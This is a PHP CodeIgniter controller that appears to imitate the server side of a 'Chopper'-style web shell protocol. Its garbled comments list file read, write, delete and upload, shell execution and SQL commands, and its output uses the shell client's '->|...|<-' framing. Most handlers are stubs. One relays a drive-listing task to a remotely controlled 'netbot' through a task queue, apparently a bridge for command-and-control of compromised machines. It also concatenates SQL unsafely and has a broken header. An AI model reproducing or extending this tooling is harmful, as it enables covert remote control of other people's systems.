<?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');

class Cd extends CI_Controller {
	 
	    public $netbotguid;
	 	  public function __construct() {
        parent::__construct();
        //$this->output->enable_profiler(TRUE);
          //error_reporting(0);  
          $this->load->helper('date');
          $this->load->helper("alwin");  
          $this->load->library("fileCache");
          $this->netbotguid="9de5f97ef4e078cc1e3b6f975133a168";     
     
       
    }
    
    
	public function index()
	{

    $Z=$_POST['cmd'];
    $Z1=@$_POST['Z1'];
    $Z2=@$_POST['Z2'];

$R = "";

try { 

switch ($Z)
{
	
/*
�õ���ǰĿ¼�ľ���·��]
�ύ��pass=A&z0=GB2312
���أ�Ŀ¼�ľ���·��\t�������Windowsϵͳ������ż����������б�
ʾ����c:\inetpub\wwwroot\ C:D:E:K:
ʾ����/var/www/html/
*/

case "A":

$R ="C:/Windows";
$R .="\t";

$file_path=$this->config->item('pathlist_path').'/'.$this->netbotguid; 
$path_hash="treelist";
$file_path=$file_path.'/'.$path_hash .'.txt';
$vars=array();
$treelist_data=$this->chat_send("treelist",$vars,$wait=2,$file_path);


	foreach ($treelist_data as $value){
		$R .=$value['name'].":";
	}





  break;


/*
[Ŀ¼���]
�ύ��pass=B&z0=GB2312&z1=Ŀ¼����·��
���أ���Ŀ¼���ļ�,Ŀ¼����Ҫ��/���ļ�����Ҫ��/
ʾ����
Ŀ¼��/\tʱ��\t��С\t����\nĿ¼��/\tʱ��\t��С\t����\n
�ļ���\tʱ��\t��С\t����\n�ļ���\tʱ��\t��С\t����\n
*/

case "B":
  
   $R .=sprintf("%s/\t%s\t0\t-\n","alwin",date('Y-m-d H:i:s',time())); //Ŀ¼  Z1
   
   $R .=sprintf("%s\t%s\t%u\t-\n","alwin",date('Y-m-d H:i:s',time()),32768);  //�ļ�
 
  break;


/*
[��ȡ�ı��ļ�]
�ύ��pass=C&z0=GB2312&z1=�ļ�����·��
���أ��ı��ļ�������
*/  
  
case "C":

  $R .="�ı��ļ�������";
  
  break;


/*
[д���ı��ļ�]
�ύ��pass=D&z0=GB2312&z1=�ļ�����·��&z2=�ļ�����
���أ��ɹ�����1,���ɹ����ش�����Ϣ

*/


case "D":
  $R = "1";
  break;
  
  
  
  /*
  [ɾ���ļ���Ŀ¼]
�ύ��pass=E&z0=GB2312&z1=�ļ���Ŀ¼�ľ���·��
���أ��ɹ�����1,���ɹ����ش�����Ϣ
  */
  
  
  case "E":
    $R = "1";
  break;
  
 /*
 [�����ļ�]
�ύ��pass=F&z0=GB2312&z1=�������ļ��ľ���·��
���أ�Ҫ�����ļ�������
 */ 
  case "F":
  header('Content-type: application/text'); 
  header('Content-Disposition: attachment; filename=$Z1'); 
  echo "�ļ�������";
  exit();
  break;
  
  /*
  [�ϴ��ļ�]
�ύ��pass=G&z0=GB2312&z1=�ļ��ϴ���ľ���·��&z2=�ļ�����(ʮ�������ı���ʽ)
���أ�Ҫ�����ļ�������
  
  */
  
  case "G":
  $R = "1";
  break;
  
  /*
  [�����ļ���Ŀ¼��ճ��]
�ύ��pass=H&z0=GB2312&z1=���Ƶľ���·��&z2=ճ���ľ���·��
���أ��ɹ�����1,���ɹ����ش�����Ϣ
  
  */
  case "H":
  $R = "1";
  break;  
  
  
  /*
  [�ļ���Ŀ¼������]
�ύ��pass=I&z0=GB2312&z1=ԭ��(����·��)&z2=����(����·��)
���أ��ɹ�����1,���ɹ����ش�����Ϣ
  
  */
    case "I":
 
  break;  
  
  /*
  [�½�Ŀ¼]
�ύ��pass=J&z0=GB2312&z1=��Ŀ¼��(����·��)
���أ��ɹ�����1,���ɹ����ش�����Ϣ
  
  */
  
  
    case "J":
  $R = "1";
  break;  
  
  
  /*
  [�޸��ļ���Ŀ¼ʱ��]
�ύ��pass=K&z0=GB2312&z1=�ļ���Ŀ¼�ľ���·��&z2=ʱ��(��ʽ��yyyy-MM-dd HH:mm:ss)
���أ��ɹ�����1,���ɹ����ش�����Ϣ
  */
  
    case "K":
  $R = "1";
  break;  
  
  /*
  [�����ļ���������]
�ύ��pass=L&z0=GB2312&z1=URL·��&z2=���غ󱣴�ľ���·��
���أ��ɹ�����1,���ɹ����ش�����Ϣ
  */
  
     case "L":
  $R = "1";
  break;  
  
  
  /*
  [ִ��Shell����(Shell·��ǰ����ݷ�����ϵͳ���ͼ���-c��/c����)]
�ύ��pass=M&z0=GB2312&z1=(-c��/c)��Shell·��&z2=Shell����
���أ�����ִ�н��
  
  */
     case "M":
   $R = "����ִ�гɹ�";
  break;  
  
  /*
  [�õ����ݿ������Ϣ]
�ύ��pass=N&z0=GB2312&z1=���ݿ�������Ϣ
���أ��ɹ��������ݿ�(���Ʊ��\t�ָ�)�� ���ɹ����ش�����Ϣ
  */
  
     case "N":
  $R = "data conn"."\t";
  break;  
  
  /*
  [��ȡ���ݿ����]
�ύ��pass=O&z0=GB2312&z1=���ݿ�������Ϣ\r\n���ݿ���
���أ��ɹ��������ݱ�(��\t�ָ�)�� ���ɹ����ش�����Ϣ
  */
  
     case "O":
    $R .= sprintf("%s/\t","alwin");
  break;  
  
  
  /*
  [��ȡ���ݱ�����]
�ύ��pass=P&z0=GB2312&z1=���ݿ�������Ϣ\r\n���ݿ���\r\n���ݱ���
���أ��ɹ�����������(���Ʊ��\t�ָ�)�� ���ɹ����ش�����Ϣ
  */
       case "P":
       $R .= sprintf("%s (%s)\t", "id", "int");

  break;  
  
  
/*  
  [ִ�����ݿ�����]
�ύ��pass=Q&z0=GB2312&z1=���ݿ�������Ϣ\r\n���ݿ���&z2=SQL����
���أ��ɹ��������ݱ����ݣ� ���ɹ����ش�����Ϣ
ע�⣺���صĵ�һ��Ϊ��ͷ������ȥÿ�зֱ����б�����ʾ������Ҫ��һ�¡����е�ÿ�к����\t|\t��ǣ�ÿ���Ա��\r\nΪ����
 */ 
     case "Q":
  echo "Number 3";
  break;  
  
  
default:
  echo "�޲���";
}

} catch (Exception $e) {   
 $R = "ERROR:// ".$e->getMessage();
  
}  
header("Content-type: text/html; charset=utf-8");
print("\x2D\x3E\x7C".$R."\x7C\x3C\x2D");
exit();  


	}
	
	  public function chat_send($tl_function,$tl_vars,$wait=0,$path=""){
  //��������
  $tl_netbot=$this->netbotguid;
  $app = $this->db->query("SELECT * FROM app where app_fun='" . $tl_function . "'  limit 1")->row_array(); 
	$task_vars=json_encode($tl_vars,JSON_UNESCAPED_UNICODE);
	
	$tl=array();
	$tl['tl_netbot']=$tl_netbot;
	$tl['tl_taskid']=0;
	$tl['tl_addtime']=date("Y-m-d H:i:s");
	$tl['tl_stauts']=0;
	$tl['tl_isback']=1;
	$tl['tl_backfun']=$app['app_backfun'];
	$tl['tl_app']=$app['app_type'];
	$tl['tl_function']=$app['app_fun'];
	$tl['tl_plug_url']=$app['app_plugurl'];
	$tl['tl_plug_md5']=$app['app_plugmd5'];
	$tl['tl_vars']=$task_vars;
	$tl['tl_type']="chat";
	$this->db->insert("tasklist_chat", $tl);
	$tl['tl_id']=$this->db->insert_id();
  if(!$wait) return $tl['tl_id'];
  $path_hash=md5($tl['tl_id']); 
  $file_path=$this->config->item('tasktmp_path').'/'.$path_hash .'.txt'; 
  
  if($wait==2){       
 	$task_data=$this->wait_task_result2($path);
   }else{
	 $task_data=$this->wait_task_result($file_path);
   }
	     if($task_data){
	     return json_decode($task_data,true);	 	          	      	   
	     }else{
	     return false;	   
	     }

	} 

	 private function wait_task_result2($file){

	 $task_data="";
	 if(file_exists($file)){
	 	$file_old_time = filemtime($file);	 		
	 }else{ 	
	 	$file_old_time = 0;
	 }
	 	 
	 $i=0; 
	 while ($i<100) // check if the data file has been modified 
{ 
  usleep(200000); // sleep 10ms to unload the CPU 
  if($file_old_time==0){
  if(file_exists($file))
  {	
  	$task_data = read_file($file);
  	return $task_data; 	
  }
}else{
    if(filemtime($file)>$file_old_time)
  {	
  	$task_data = read_file($file);
  	return $task_data; 	
  }
}
  
  
  $i++;  
} 	

		return false;


	 }

   private function wait_task_result($file){

 	 $task_data ="";
	 $i=0; 
	 while ($i<100) // check if the data file has been modified 
{ 
  usleep(200000); // sleep 10ms to unload the CPU 
  if(file_exists($file))
  {	
  	$task_data = read_file($file);
  	//unlink($file);
  	return $task_data; 	
  }
 
  $i++;  
} 	

		return false;


	 }  


	


	
}

